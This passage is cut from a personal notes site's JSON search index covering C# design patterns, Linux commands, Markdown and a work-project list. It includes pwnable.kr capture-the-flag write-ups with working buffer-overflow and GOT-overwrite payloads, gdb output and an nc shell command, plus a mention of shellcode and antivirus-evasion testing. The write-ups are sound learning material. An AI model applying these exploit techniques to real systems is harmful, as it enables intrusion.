WriteLine(foo2); } } } .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Creational/Prototype.html",
    "relUrl": "/docs/design-pattern/Creational/Prototype.html"
  },
  "12": {
    "title": "RaspberryPi",
    "content": "RaspberryPi Application Docs . Using I2C_tools . You have an I2C device attached to your Raspberry Pi, and you want to know how to check that it’s attached and to find its I2C address. . sudo apt-get install i2c-tools sudo i2cdetect -y 1 . stream cctv . ./mjpg_streamer -i &quot;./input_uvc.so&quot; -o &quot;./output_http.so -w ./www&quot; .",
    "url": "http://localhost:4000/_notes/docs/python/RaspberryPi.html",
    "relUrl": "/docs/python/RaspberryPi.html"
  },
  "13": {
    "title": "Singleton",
    "content": "Singleton 模式 . Singleton 的英文意義是獨身，也就是只有一個人，應用在物件導向語言上，通常翻譯作單例：單一個實例（Instance）。Singleton 模式可以保證一個類別只有一個實例，並提供一個訪問（visit）這個實例的方法。 . . using System; using System.Collections.Generic; using System.IO; using System.Linq; using System.Security.Cryptography; using System.Text; using System.Threading.Tasks; using Autofac; using MoreLinq; using NUnit.Framework; using static System.Console; namespace DotNetDesignPatternDemos.Creational.Singleton { public interface IDatabase { int GetPopulation(string name); } public class SingletonDatabase : IDatabase { private Dictionary&lt;string, int&gt; capitals; private static int instanceCount; public static int Count =&gt; instanceCount; private SingletonDatabase() { WriteLine(&quot;Initializing database&quot;); capitals = File.ReadAllLines( Path.Combine( new FileInfo(typeof(IDatabase).Assembly.Location).DirectoryName, &quot;capitals.txt&quot;) ) .Batch(2) .ToDictionary( list =&gt; list.ElementAt(0).Trim(), list =&gt; int.Parse(list.ElementAt(1))); } public int GetPopulation(string name) { return capitals[name]; } // laziness + thread safety private static Lazy&lt;SingletonDatabase&gt; instance = new Lazy&lt;SingletonDatabase&gt;(() =&gt; { instanceCount++; return new SingletonDatabase(); }); public static IDatabase Instance =&gt; instance.Value; } public class SingletonRecordFinder { public int TotalPopulation(IEnumerable&lt;string&gt; names) { int result = 0; foreach (var name in names) result += SingletonDatabase.Instance.GetPopulation(name); return result; } } public class ConfigurableRecordFinder { private IDatabase database; public ConfigurableRecordFinder(IDatabase database) { this.database = database; } public int GetTotalPopulation(IEnumerable&lt;string&gt; names) { int result = 0; foreach (var name in names) result += database.GetPopulation(name); return result; } } public class DummyDatabase : IDatabase { public int GetPopulation(string name) { return new Dictionary&lt;string, int&gt; { [&quot;alpha&quot;] = 1, [&quot;beta&quot;] = 2, [&quot;gamma&quot;] = 3 }[name]; } } /// &lt;summary&gt; /// IMPORTANT: be sure to turn off shadow copying for unit tests in R#! /// &lt;/summary&gt; [TestFixture] public class SingletonTests { [Test] public void IsSingletonTest() { var db = SingletonDatabase.Instance; var db2 = SingletonDatabase.Instance; Assert.That(db, Is.SameAs(db2)); Assert.That(SingletonDatabase.Count, Is.EqualTo(1)); } [Test] public void SingletonTotalPopulationTest() { // testing on a live database var rf = new SingletonRecordFinder(); var names = new[] {&quot;Seoul&quot;, &quot;Mexico City&quot;}; int tp = rf.TotalPopulation(names); Assert.That(tp, Is.EqualTo(17500000 + 17400000)); } [Test] public void DependantTotalPopulationTest() { var db = new DummyDatabase(); var rf = new ConfigurableRecordFinder(db); Assert.That( rf.GetTotalPopulation(new[]{&quot;alpha&quot;, &quot;gamma&quot;}), Is.EqualTo(4)); } } public class Demo { static void Main() { var db = SingletonDatabase.Instance; // works just fine while you&#39;re working with a real database. var city = &quot;Tokyo&quot;; WriteLine($&quot;{city} has population {db.GetPopulation(city)}&quot;); // now some tests } } } .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Creational/Singleton.html",
    "relUrl": "/docs/design-pattern/Creational/Singleton.html"
  },
  "14": {
    "title": "Structural",
    "content": "設計模式 . Creational 模式 . 如何設計物件之間 的靜態結構，如何完成物件之間的繼承、實 現與依賴關係，這關乎著系統設計出來是否健壯（robust）：像是易懂、易維護、易修改、耦合度低等等議題。Structural 模式正如其名，其分類下的模式給出了在不同場合下所適用的各種物件關係結構。 . Default Adapter 模式 | Adapter 模式 - Object Adapter | Adapter 模式 - Class Adapter | Bridge 模式 | Composite 模式 | Decorator 模式 | Facade 模式 | Flyweight 模式 | Proxy 模式 | .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Structural/Structural.html",
    "relUrl": "/docs/design-pattern/Structural/Structural.html"
  },
  "15": {
    "title": "About me",
    "content": "This Page is for noting something I occurred included IT, traveling and something I feel interested. . about me . Jerry Huang | Chinese Name:黃建智 | IT engineer | . specialize: . .NET | Python | Javascript | WEB Stack | IOT | .",
    "url": "http://localhost:4000/_notes/about/",
    "relUrl": "/about/"
  },
  "16": {
    "title": "aliases_ps_jobcontrol",
    "content": "Aliases . Fix Typos $&gt; alias grpe=&#39;grep&#39; . | Make Linux behave like another OS. $&gt; alias cls=&#39;clear&#39; . | unalias name Remove the “name” alias. | unalias -a Remove all aliases | Add aliases to your personal initialization $&gt; echo &quot;alias ll=&#39;ls -a&#39;&quot; &gt;&gt; ~/.bashrc $&gt; source ~/.bashrc . | . Listing Processes and Information . ps Options . -e Everything, all processes. | -f Full format listing. | -u username Display username’s processes. | -p pid Display information for PID. | . Common ps Commands . ps -e Display all processes. | ps -ef Display all processes, full. | ps -eH Display a process tree. | ps -e –forest Display a process tree. | ps -u username Display user’s processes. | . Other ways to view processes . pstree Display processes in a tree format. | top Interactive process viewer. | htop Interactive process viewer. | . Background and Foreground Processes . command &amp; Start command in background. | Ctrl-c Kill the foreground process. | Ctrl-z Suspend the foreground process. | bg [%num] Background a suspended process. | fg [%num] Foreground a background process. | kill Kill a process by job number or PID. | jobs [%num] List jobs. | . Killing Processes . Ctrl-c Kills the foreground proc. | kill [-sig] pid Send a signal to a process. | kill -l Display a list of signals. | kill 123 | kill -15 123 | kill -TERM 123 kill -9 123 | .",
    "url": "http://localhost:4000/_notes/docs/linux/aliases_ps.html",
    "relUrl": "/docs/linux/aliases_ps.html"
  },
  "17": {
    "title": "customizing_shell_prompt",
    "content": "Shell prompt customization . d Date in “Weekday Month Date” format “Tue May 26” | h Hostname up to the first period | H Hostname | n Newline | t Current time in 24-hour HH:MM:SS format | T Current time in 12-hour HH:MM:SS format . | @ Current time in 12-hour am/pm format | A Current time in 24-hour HH:MM format | u Username of the current user | w Current working directory | W Basename of the current working directory | $ if the effective UID is 0, a #, otherwise a $ | . $ echo &#39;export PS1=&quot;[ u@ h w] $ &quot;&#39; &gt;&gt; ~/.bash_profile setting step: echo $PS1 [ u@ h W] PS1=&quot; u@ h $&quot; PS1 = &quot;&lt; t u@ h w&gt; $&quot; &lt;09:23:32 Jerry@linux_user ~&gt;$ .",
    "url": "http://localhost:4000/_notes/docs/linux/customizing_shell_prompt.html",
    "relUrl": "/docs/linux/customizing_shell_prompt.html"
  },
  "18": {
    "title": "Design_pattern",
    "content": "物件導向程式設計的 4 個重要特性 . 抽象 ( Abstraction ) | 將真實世界的需求轉換成為 OOP 中的類別 | 類別可以包含狀態(屬性)與行為(方法)。 | 封裝 ( Encapsulation ) | 隱藏/保護內部實作的細節，並可以對屬性或方法設定存取層級 (public, private, protected)。 | 繼承 ( Inheritance ) | 可讓您建立新類別以重複使用、擴充和修改其他類別中定義的行為。 | 多型 ( Polymorphism ) | 在相同的介面下，可以用不同的型別來實現。 | 多型有分成好幾種不同類型。 | . 內聚力 Cohesion . 在一個 “模組” 內完成 “一件工作” 的度量指標 . 耦合力 Coupling . 模組與模組之間的關聯強度，模組之間相互依賴的程度 . SOLID . The S.O.L.I.D. Principles of Object Oriented Design . 單一責任原則 SRP Single Responsibility Principle A class should have only one reason to change. | 參考 YAGNI（You Ain’t Gonna Need It）原則 | 不用急於在第一時間就專注於分離責任 | 尚未出現的需求 (未來的需求) 不需要預先分離責任 | 當需求變更的時候，再進行類別分割即可！ | SRP 是 SOLID 中最簡單的，但卻是最難做到的 | 需要不斷提升你的開發經驗與重構技術 | 如果你沒有足夠的經驗去定義一個物件的 Responsibility那麼建議你不要過早進行 SRP 規劃！ | . | 開放封閉原則 OCP Open Closed Principle Software entities (classes, modules, functions, etc.)should be open for extension but closed for modification | 藉由增加新的程式碼來擴充系統的功能，而不是藉由修改原本已經存在的程式碼來擴充系統 | 關於 OCP 的使用時機 你既有的類別已經被清楚定義，處於一個強調穩定的狀態 | 你需要擴充現有的類別，加入新需求的屬性或方法 | 你擔心修改現有程式碼會破壞現有系統的運作 | 系統剛開始設計時就決定要採用 OCP 模式 | 可以透過 “介面” 或 “抽象類別” 進行實作 | | . | . | 里氏替換原則 LSP Liskov Substitution Principle Subtypes must be substitutable for their base types. | 子型別必需可替換為他的基底型別 | 如果你的程式有採用繼承或介面，然後建立出幾個不同的衍生型別 (Subtypes)。在你的系統中只要是基底型別出現的地方，都可以用子型別來取代，而不會破壞程式原有的行為。 | 關於 LSP 的基本精神 當實作繼承時，必須確保型別轉換後還能得到正確的結果 | 每個衍生類別都可以正確地替換為基底類別，且程式在執行時不會有異常的情況 (如發生執行時期例外) | 必須正確的實作 “繼承” 與 “多型” | . | 關於 LSP 的實作方式 採用類別繼承方式來進行開發 | 需注意繼承的實作方式 | 利用 “介面” ( interface ) 來定義基底型別 ( base type ) | . | . | 介面隔離原則 ISP Interface Segregation Principle Many client specific interfaces are better than one general purpose interface. | Clients should not be forced to depend upon interfaces that they don’t use. | 針對不同需求的用戶端，僅開放其對應需求的介面就好 | 關於 ISP 的實作方式 依據用戶端需求，將介面進行分割或群組 | . | . | 相依反轉原則 DIP Dependency Inversion Principle High-level modules should not depend on low-level modules. Both should depend on abstractions. | Abstractions should not depend on details. Details should depend on abstractions | 高階模組不應該依賴於低階模組，兩者都應相依於抽象 高階模組 -&gt; Caller (呼叫端) | 低階模組 -&gt; Callee (被呼叫端) | 抽象不應該相依於細節。而細節則應該相依於抽象 | . | 關於 DIP 的基本精神 所有類別都要相依於抽象，而不是具體實作 | 為了要達到類別間鬆散耦合的目的 | 開發過程中，所有類別之間的耦合關係一律透過抽象介面 | . | 關於 DIP 的實作方式 型別全部都相依於抽象，而不是具體實作 | 經過套用 DIP 之後，原來有相依於類別的程式碼 | 都改成相依於抽象型別 | 從緊密耦合關係變成鬆散耦合關係 | 可以依據需求，隨時抽換具體實作類別 | . | . | . Conclusion . 1.找出程式中可能需要更動之處，把它們獨立出來，不要和那些不需要更動的程式碼混在一起。 2.寫程式是針對介面寫，而不是針對實踐方式而寫。 3.多用合成，少用繼承。 . 程式設計是思維具體化的一種方式，是思考如何解決問題的過程，設計模式是在解決問題的過程中，一些良好思路的經驗集成，最早講設計模式，人們總會提到 Gof的著作，它最早將經典的 23 種模式集合在一起說明，對後期學習程式設計，尤其是對從事物件導向程式設計的人們起了莫大的影響。後來設計模式一詞被廣泛的應用到各種經驗集成，甚至還有反模式 （AntiPattern），反模式教導您如何避開一些常犯且似是而非的程式設計思維。 .",
    "url": "http://localhost:4000/_notes/docs/design_pattern",
    "relUrl": "/docs/design_pattern"
  },
  "19": {
    "title": "file_manipulate",
    "content": "Removing Files . rm file Remove file. | rm -r dir Remove the directory and its contents recursively. | rm -f file Force removal and never prompt for confirmation. | . copy . cp source_file destination_file Copy source_file to destination_file. . | cp src_file1 [src_fileN …] dest_dir Copy source_files to destination_directory. . | . Moving and Renaming Files . mv source destination | mv -i source destination | . Creating a Collection of Files . tar [-] c|x|t f tarfile [pattern] Create, extract or list contents of a tar archive using pattern, if supplied. . | tar Options | . options   . c | Create a tar archive. | . x | Extract files from the archive. | . t | Display the table of contents (list). | . v | Be verbose. | . z | Use compression. | . f | file Use this file. | . Disk Usage . du Estimates file usage. | du -k Display sizes in Kilobytes. | du -h Display sizes in human readable format. | . Comparing Files . diff file1 file2 Compare two files. | sdiff file1 file2 Side-by-side comparison. | vimdiff file1 file2 Highlight differences in vim. | .",
    "url": "http://localhost:4000/_notes/docs/linux/file_manipulate.html",
    "relUrl": "/docs/linux/file_manipulate.html"
  },
  "20": {
    "title": "grep_command",
    "content": "Grep Command . grep Display lines matching a pattern. | grep pattern file | . -i Perform a search, ignoring case. -c Count the number of occurrences in a file. -n Precede output with line numbers. -v Invert Match. Print lines that don’t match. . The file Command . file file_name Display the file type . $ file sales.data sales.data: ASCII text $ file * bin: directory jason.tar: POSIX tar archive . Searching for Text in Binary Files . strings Display printable strings. . Pipes . | Pipe symbol | command-output | command-input | . | . grep pattern file cat file | grep pattern . The cut Command . -cut [file] . Cut out selected portions of file. If file is omitted, use standard input. . -d delimiter Use delimiter as the field separator. -f N Display the Nth field. . sample code . grep bob /etc/passwd | cut -d: -f 1,5 | sort | tr &quot;:&quot; &quot; &quot; | column -t .",
    "url": "http://localhost:4000/_notes/docs/linux/grep_command.html",
    "relUrl": "/docs/linux/grep_command.html"
  },
  "21": {
    "title": "IDE-tools",
    "content": "開發工具 . 紀錄常用快捷列 | 紀錄設定 | .",
    "url": "http://localhost:4000/_notes/docs/ide-tools",
    "relUrl": "/docs/ide-tools"
  },
  "22": {
    "title": "",
    "content": "",
    "url": "http://localhost:4000/_notes/",
    "relUrl": "/"
  },
  "23": {
    "title": "Linux",
    "content": "linux . linux administrator commands | linux shellscript | .",
    "url": "http://localhost:4000/_notes/docs/linux",
    "relUrl": "/docs/linux"
  },
  "24": {
    "title": "linux_basic_command",
    "content": "ls options . -a List all files, including hidden files. | –color List files with colorized output. | -d List directory names, not contents. | -l Use the long listing format. | -r Reverse the order. | -R List files recursively. | -t Sort by time, most recent first. | . Permission Explained . options U G O . Symbolic | rwx | r-x | r– | . Binary | 111 | 101 | 100 | . Decimal | 7 | 5 | 4 | . The find and locate Command . find [path…] [expression] . -name pattern Find files and directories that match pattern. | -iname pattern Like -name, but ignores case. | -ls Performs an ls on each of the found items | -mtime days Finds files that are days old. | -size num Finds file that are of size num. | -newer file Finds files that are newer than file. | .",
    "url": "http://localhost:4000/_notes/docs/linux/linux_basic_command.html",
    "relUrl": "/docs/linux/linux_basic_command.html"
  },
  "25": {
    "title": "markdown_sample",
    "content": "Href Link . [這是一個行內連結](https://www.google.com) [這是一個帶有標題的行內連結](https://www.google.com &quot;Google&#39;s Homepage&quot;) [這是一個參考連結][Arbitrary case-insensitive reference text] [這是一個對應到 Git 倉儲檔案的相對參考連結](../blob/master/LICENSE) [參考標的物也可以使用數字][1] 直接使用文字對應也可以 [這段文字連到參考項目] 參考項目可以寫在文檔的最後，有點像書內的註解（註腳）。 [arbitrary case-insensitive reference text]: https://www.mozilla.org [1]: http://slashdot.org [這段文字連到參考項目]: http://www.reddit.com . 這是一個行內連結 . 這是一個帶有標題的行內連結 . 這是一個參考連結 . 這是一個對應到 Git 倉儲檔案的相對參考連結 . 參考標的物也可以使用數字 . 直接使用文字對應也可以 這段文字連到參考項目 . 參考項目可以寫在文檔的最後，有點像書內的註解（註腳）。 . I get 10 times more traffic from [Google][] than from [Yahoo][] or [MSN][]. [google]: http://google.com/ &quot;Google&quot; [yahoo]: http://search.yahoo.com/ &quot;Yahoo Search&quot; [msn]: http://search.msn.com/ &quot;MSN Search&quot; . I get 10 times more traffic from Google than from Yahoo or MSN. . &lt;http://example.com/&gt; . http://example.com/ — . stronger . *single asterisks* _single underscores_ **double asterisks** __double underscores__ . single asterisks . single underscores . double asterisks . double underscores . . Code . Use the printf() function. . Youtube Link . &lt;a href=&quot;http://www.youtube.com/watch?feature=player_embedded&amp;v=YOUTUBE_VIDEO_ID_HERE &quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg&quot; alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt; [![IMAGE ALT TEXT HERE](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE) . . .",
    "url": "http://localhost:4000/_notes/docs/markdown/markdownsample.html",
    "relUrl": "/docs/markdown/markdownsample.html"
  },
  "26": {
    "title": "Markdown",
    "content": "markdwon . 基礎語法 | 範本 | .",
    "url": "http://localhost:4000/_notes/docs/markdown",
    "relUrl": "/docs/markdown"
  },
  "27": {
    "title": "Pentrue-test",
    "content": "pentrue-test . something about pt and fuzzy practice .",
    "url": "http://localhost:4000/_notes/docs/pentrue-test",
    "relUrl": "/docs/pentrue-test"
  },
  "28": {
    "title": "pwnable_bof",
    "content": "pwnable bof . Source : . pwnable.kr . fuzzy 模糊字串產生方便debug . import string import random def id_generator(size=6, chars=string.ascii_uppercase + string.digits): return &#39;&#39;.join(random.choice(chars) for _ in range(size)) . | . 執行結果 . id_generator() . ‘G5G74W’ . id_generator(3, “6793YUIO”) . ‘Y3U’ . 程式原始碼 . #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah.. n&quot;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } . smash me! | if(key == 0xcafebabe)…… | 觀察key的位址直接修改 | . . solution . #debug python -c &quot;print &#39;A&#39;*52+&#39; xbe xba xfe xca&#39;&quot; &gt; input.txt #gdb r &lt; input.txt #nc pwnable.kr 9000 #keep stding with python cat &lt;(python -c &quot;print &#39;A&#39;*52+&#39; xbe xba xfe xca&#39;&quot;) - | nc pwnable.kr 9000 .",
    "url": "http://localhost:4000/_notes/docs/pentrue-test/pwnable%20bof.html",
    "relUrl": "/docs/pentrue-test/pwnable%20bof.html"
  },
  "29": {
    "title": "pwnable_passout_code",
    "content": "pwnable pass code . Source : . pwnable.kr | gcc stack protection | gcc stack protection2 | linux got | linux got . 程式原始碼 . | . #include &lt;stdio.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void login(){ int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking... n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337){ printf(&quot;Login OK! n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed! n&quot;); exit(0); } } void welcome(){ char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s! n&quot;, name); } int main(){ printf(&quot;Toddler&#39;s Secure Login System 1.0 beta. n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :) n&quot;); return 0; } . . solution . 查got表 . passcode@ubuntu:~$ readelf -r passcode Relocation section &#39;.rel.dyn&#39; at offset 0x388 contains 2 entries: Offset Info Type Sym.Value Sym. Name 08049ff0 00000606 R_386_GLOB_DAT 00000000 __gmon_start__ 0804a02c 00000b05 R_386_COPY 0804a02c stdin@GLIBC_2.0 Relocation section &#39;.rel.plt&#39; at offset 0x398 contains 9 entries: Offset Info Type Sym.Value Sym. Name 0804a000 00000107 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 ##使用這個位址 0804a004 00000207 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 0804a008 00000307 R_386_JUMP_SLOT 00000000 __stack_chk_fail@GLIBC_2.4 0804a00c 00000407 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 0804a010 00000507 R_386_JUMP_SLOT 00000000 system@GLIBC_2.0 0804a014 00000607 R_386_JUMP_SLOT 00000000 __gmon_start__ 0804a018 00000707 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 0804a01c 00000807 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a020 00000907 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 . disas login . 查完之後會發現scanf前的地址-0x10(%ebp) 剛好在’a’*96的後四位… gef➤ x/x $ebp -0x10 0xffffcff8: 0x0804a010 . | 將位址替換成fflush | scanf %d 0x080485e3(134514147),此處使很關鍵的地方表示fflush會被替換成 0x080485e3 &lt;+127&gt;: movl $0x80487af,(%esp) | ‘ n’ 應該表示是字串結尾 0xffffcff0: 0x61616161 0x61616161 0x0804a010 0x4ff54700 0xffffd000: 0x08048800 0xffffd0c4 0xffffd018 0x080486e0 0xffffd010: 0xf7fb23dc 0xffffd030 0x00000000 0xf7e18637 0xffffd020: 0xf7fb2000 0xf7fb2000 0x00000000 0xf7e18637 0xffffd030: 0x00000001 0xffffd0c4 0xffffd0cc 0x00000000 0xffffd040: 0x00000000 0x00000000 0xf7fb2000 0xf7ffdc04 0xffffd050: 0xf7ffd000 0x00000000 0xf7fb2000 0xf7fb2000 0xffffd060: 0x00000000 0xab31c77d 0x979a496d 0x00000000 . (gdb) disas login Dump of assembler code for function login: 0x08048564 &lt;+0&gt;: push %ebp 0x08048565 &lt;+1&gt;: mov %esp,%ebp 0x08048567 &lt;+3&gt;: sub $0x28,%esp 0x0804856a &lt;+6&gt;: mov $0x8048770,%eax 0x0804856f &lt;+11&gt;: mov %eax,(%esp) 0x08048572 &lt;+14&gt;: call 0x8048420 &lt;printf@plt&gt; 0x08048577 &lt;+19&gt;: mov $0x8048783,%eax 0x0804857c &lt;+24&gt;: mov -0x10(%ebp),%edx 0x0804857f &lt;+27&gt;: mov %edx,0x4(%esp) 0x08048583 &lt;+31&gt;: mov %eax,(%esp) 0x08048586 &lt;+34&gt;: call 0x80484a0 0x0804858b &lt;+39&gt;: mov 0x804a02c,%eax 0x08048590 &lt;+44&gt;: mov %eax,(%esp) 0x08048593 &lt;+47&gt;: call 0x8048430 &lt;fflush@plt&gt; 0x08048598 &lt;+52&gt;: mov $0x8048786,%eax 0x0804859d &lt;+57&gt;: mov %eax,(%esp) 0x080485a0 &lt;+60&gt;: call 0x8048420 &lt;printf@plt&gt; 0x080485a5 &lt;+65&gt;: mov $0x8048783,%eax 0x080485aa &lt;+70&gt;: mov -0xc(%ebp),%edx 0x080485ad &lt;+73&gt;: mov %edx,0x4(%esp) 0x080485b1 &lt;+77&gt;: mov %eax,(%esp) 0x080485b4 &lt;+80&gt;: call 0x80484a0 0x080485b9 &lt;+85&gt;: movl $0x8048799,(%esp) 0x080485c0 &lt;+92&gt;: call 0x8048450 &lt;puts@plt&gt; 0x080485c5 &lt;+97&gt;: cmpl $0x528e6,-0x10(%ebp) 0x080485cc &lt;+104&gt;: jne 0x80485f1 &lt;login+141&gt; 0x080485ce &lt;+106&gt;: cmpl $0xcc07c9,-0xc(%ebp) 0x080485d5 &lt;+113&gt;: jne 0x80485f1 &lt;login+141&gt; 0x080485d7 &lt;+115&gt;: movl $0x80487a5,(%esp) 0x080485de &lt;+122&gt;: call 0x8048450 &lt;puts@plt&gt; ##調用system ## 0x080485e3 &lt;+127&gt;: movl $0x80487af,(%esp) ## 0x080485ea &lt;+134&gt;: call 0x8048460 &lt;system@plt&gt; 0x080485ef &lt;+139&gt;: leave 0x080485f0 &lt;+140&gt;: ret 0x080485f1 &lt;+141&gt;: movl $0x80487bd,(%esp) 0x080485f8 &lt;+148&gt;: call 0x8048450 &lt;puts@plt&gt; 0x080485fd &lt;+153&gt;: movl $0x0,(%esp) 0x08048604 &lt;+160&gt;: call 0x8048480 &lt;exit@plt&gt; End of assembler dump. . print int(&quot;0x080485e3&quot;, 0) 134514147 python -c &quot;print (&#39;a&#39;*96+&#39; x04 xa0 x04 x08&#39;+&#39; n&#39;+&#39;134514147 n&#39;)&quot; | ./passcode . ### localtest . | . 0x80485bc &lt;login+33&gt; call 0x8048480 &lt;__isoc99_scanf@plt&gt; 0x80485c1 &lt;login+38&gt; add esp, 0x10 0x80485c4 &lt;login+41&gt; mov eax, ds:0x804a040 0x80485c9 &lt;login+46&gt; sub esp, 0xc 0x80485cc &lt;login+49&gt; push eax → 0x80485cd &lt;login+50&gt; call 0x8048420 &lt;fflush@plt&gt; ＃call 0x080485e3 ↳ 0x8048420 &lt;fflush@plt+0&gt; jmp DWORD PTR ds:0x804a010 0x8048426 &lt;fflush@plt+6&gt; push 0x8 0x804842b &lt;fflush@plt+11&gt; jmp 0x8048400 0x8048430 &lt;__stack_chk_fail@plt+0&gt; jmp DWORD PTR ds:0x804a014 0x8048436 &lt;__stack_chk_fail@plt+6&gt; push 0x10 0x804843b &lt;__stack_chk_fail@plt+11&gt; jmp 0x8048400 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]──── [#0] Id 1, Name: &quot;passcode&quot;, stopped, reason: SINGLE STEP ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]──── [#0] 0x80485cd → Name: login() [#1] 0x80486e0 → Name: main() ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── gef➤ n [New process 25845] process 25845 is executing new program: /bin/dash Error in re-setting breakpoint 1: Function &quot;login&quot; not defined. [New process 25846] process 25846 is executing new program: /bin/cat lfagqqqqqq!!!! n [Inferior 3 (process 25846) exited normally] enter passcode1 : Now I can safely trust you that you have credential :) [*] No debugging session active gef➤ .",
    "url": "http://localhost:4000/_notes/docs/pentrue-test/pwnable%20pass%20out%20code.html",
    "relUrl": "/docs/pentrue-test/pwnable%20pass%20out%20code.html"
  },
  "30": {
    "title": "Python",
    "content": "python . 範例程式 | 套件使用 | 參考文件 | .",
    "url": "http://localhost:4000/_notes/docs/python",
    "relUrl": "/docs/python"
  },
  "31": {
    "title": "python_Violent_technical_skill",
    "content": "Python Docs . python_attack_technical Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers. . | .",
    "url": "http://localhost:4000/_notes/docs/python/python_Violent_technical_skill.html",
    "relUrl": "/docs/python/python_Violent_technical_skill.html"
  },
  "32": {
    "title": "vscode short cut",
    "content": "Visual studio Core 快捷 . 行操作 . ALT + 上 或 ALT + 下 快速移動一整行 | SHIFT + ALT + down 複製一行 | CTRL+SHIFT+k 刪除一行 | CTRL + X 刪除目前行 | SHIFT + ALT + ↓ 複製此行到下一行 | . 快速選擇 . CTRL + F2 選取所有相同的名稱 | ALT + mouse click 多重選擇 | CTRL + SHIFT + 左右方向鍵 一次移動多選取一個單詞 | SHIFT + 上下方向鍵 上下移動選取區塊 | 搜尋 . | CTRL+SHIFT+F 在檔案中尋找 | . 其他 . F8 依序查看警告訊息 | ALT + F12 查看定義 | CTRL + k, CTRL+0 摺疊 | CTRL + n 分割視窗 | .",
    "url": "http://localhost:4000/_notes/docs/ide-tools/vs_core_shortcut.html",
    "relUrl": "/docs/ide-tools/vs_core_shortcut.html"
  },
  "33": {
    "title": "wildcard",
    "content": "WildCard . matches zero or more characters. *.txt a* a*.txt . | ? - matches exactly one character. ?.txt a? a?.txt . | [] - A character class. Matches any of the characters included between the brackets. Matches exactly one character. [aeiou] ca[nt]* can cat candy catch . | [!] - Matches any of the characters NOT included between the brackets. Matches exactly one character. [!aeiou]* baseball cricket . | More Wildcards - Ranges Use two characters separated by a hyphen to create a range in a character class [a-g]* Matches all files that start with a, b, c, d, e, f, or g. [3-6]* Matches all files that start with 3, 4, 5 or 6. . | .",
    "url": "http://localhost:4000/_notes/docs/linux/wildcard.html",
    "relUrl": "/docs/linux/wildcard.html"
  },
  "34": {
    "title": "Work",
    "content": "一些曾經做過的專案 .",
    "url": "http://localhost:4000/_notes/docs/work",
    "relUrl": "/docs/work"
  },
  "35": {
    "title": "work_Chinese",
    "content": "開發系統簡介資料 . 1.憑證驗證 . 為了整合國軍智慧卡驗證機制，針對國軍客製化智慧卡進行驗證程序設計，用戶端將智慧卡插入讀卡機後，透過憑證驗證程式，輸入PinCode後進行第一階段驗證，當PinCode驗證完成後，進入卡片讀取簽章憑證資訊並驗證其校期，再來由驗證伺服至LDAP取出身份識別，並將憑證序號送入MCA進行驗證，檢查該張憑證是否有效。 . 2.Reserving and Pentesting . 針對反組譯及ShellCode撰寫如圖2-1，藉此熟悉組合語言並僚解底層運作原理，後續並利用編碼方式測試防毒軟體偵測及ShellCode規避能力。 . 3.員額報表系統 . 配合人事部門開發，使用WPF、MVC及Restful架構，並結合OneTimeToken產製、憑證驗證。開發工項包含報表60種、帳號管理、角色權限管理，輸入及參數設定，開發時間約1年，現為人事核心系統。 其中在每日員額統計使用樹狀圖顯示所有單位，並提供使用者勾選後，查找子單位及併計單位總量的功能，在開發時初期使用遞歸方式，在後續分析後，發現大量查找時出現效能瓶頸，遞歸過程中出現大量重複運算，後續利用動態規劃減少計算量後，成功解決問題。 . 4.電腦資產管控及視覺化 . 配合單位重新佈署作業系統，於作業系統內部署回報程式，使單位可掌握目前作業系統安裝狀況，並結合資產、網管及回報系統資料庫同步及排程回饋，利用圖表視覺化顯示相關資訊。 . 5.災害防救資訊系統發展 . 因救災任務順遂，105年時開發「災害防救資訊系統」，整合內政部TGOS救災圖層資訊、GoogleMapAPI、SignalR，Client使用Android行動裝置。 . 6.線上歸鄉報到 . 撰寫離營歸鄉報到系統，107年時完成與內政部資訊系統構連，節省離退人員往返市區公所報到時間。 . 7.補繳年資系統 . 整合公務人員退休撫卹基金會，107年時開發國軍購買年資系統，完成8萬人補繳工程…整個開發及測試時間嚴重壓縮，幸運的最後平安結束，自己也被扣了4萬多Ｏrz。 . 8.其他開發項目 . 由於單位關係…很多東西連畫面都沒辦法截…只能列表 . :closed_book: 系統開發項目 . 軍人保險計算查詢系統 | 志願役士兵起役系統 | 單位門戶網站含後台 | 代碼查詢系統 | SyBase拓樸查詢系統 | 國軍軟體管理資訊系統 | 門戶網站仿WebDesktop | 退除役資料交換Web服務 | 驗證碼產生WebService | 問卷調查系統 | . :closed_book: 系統維護項目 . 人事資訊系統(7個子系統) | 人事查詢系統(5個子系統) | 人事線傳系統 